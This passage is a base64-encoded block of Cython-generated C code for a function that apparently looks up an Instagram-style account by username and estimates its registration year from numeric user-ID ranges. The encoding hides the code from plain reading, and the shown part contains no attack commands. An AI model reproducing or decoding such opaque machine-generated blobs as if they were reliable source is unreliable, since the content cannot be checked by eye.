NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMjsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcikKICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl91c2VybmFtZSA9IHZhbHVlc1swXTsKICAgIF9fcHl4X3ZfZG9tYWluID0gdmFsdWVzWzFdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMmF3XzE0SW5mb0FjYyhfX3B5eF9zZWxmLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2RvbWFpbik7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmF3XzE0SW5mb0FjYyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9kb21haW4pIHsKICBQeU9iamVjdCAqX19weXhfdl9hY2NvdW50X2luZm8gPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfaWRfaW50ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZWdfZGF0ZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZm9sbG93ZXJzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mb2xsb3dpbmcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2luZm9fdGV4dCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3Zfa2V5Ym9hcmQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzU7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfOTsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xM1sxNV07CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTc7CiAgUHlPYmplY3QgKl9fcHl4X3RfMThbM107CiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMOwogIGludCBfX3B5eF90XzIwOwogIGludCBfX3B5eF90XzIxOwogIGNoYXIgY29uc3QgKl9fcHl4X3RfMjI7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjYgPSBOVUxMOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkluZm9BY2MiLCAwKTsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMwMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzUgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNSA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfM307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX3B5eF92X2FjY291bnRfaW5mbyA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfYWNjb3VudF9pbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIF9fcHl4X3ZfdXNlcl9pZCA9IF9fcHl4X3RfNDsKICBfX3B5eF90XzQgPSAwOwoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzYsICZfX3B5eF90XzcsICZfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl91c2VyX2lkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzAzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3ZfdXNlcl9pZF9pbnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF80LCAmX19weXhfdF8xLCAmX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCAzMDQsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKCiAgICAgIAogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApOwogICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X3VzZXJfaWRfaW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF82LCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF82LCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAogIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCBfX3B5eF92X3VzZXJfaWRfaW50LCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzA3LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMykpIHsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOwogICAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91c2VyX2lkX2ludCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEyNzg4ODksIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMDcsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAzMDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChfX3B5eF90XzkpIHsKCiAgICAKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMCk7CiAgICBfX3B5eF92X3JlZ19kYXRlID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTA7CgogICAgCiAgICBnb3RvIF9fcHl4X0wxMTsKICB9CgogIAogIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMjc5MDAwLCBfX3B5eF92X3VzZXJfaWRfaW50LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzA5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMykpIHsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOwogICAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91c2VyX2lkX2ludCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE3NzUwMDAwLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzA5LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTEpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDExOwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDEsIF9fcHl4X3ZfdXNlcl9pZF9pbnQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMTEsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKSkgewogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7CiAgICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VzZXJfaWRfaW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjc5NzYwMDAwLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzExLCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTIpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEyOwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjc5NzYwMDAxLCBfX3B5eF92X3VzZXJfaWRfaW50LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzEzLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMykpIHsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOwogICAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91c2VyX2lkX2ludCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMxMywgX19weXhfTDFfZXJyb3IpCiAgfQogIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDMxMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgaWYgKF9fcHl4X3RfOSkgewoKICAgIAogICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEzKTsKICAgIF9fcHl4X3ZfcmVnX2RhdGUgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxMzsKCiAgICAKICAgIGdvdG8gX19weXhfTDExOwogIH0KCiAgCiAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMSwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMxNSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xNjI5MDEwMDAwLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzE1LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzE1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE0OwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTYyOTAxMDAwMSwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMxNywgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMzY5MzU5NzYxLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzE3LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTUpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE1OwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjM2OTM1OTc2MiwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMxOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF80MjM5NTE2NzU0LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzE5LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzE5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAg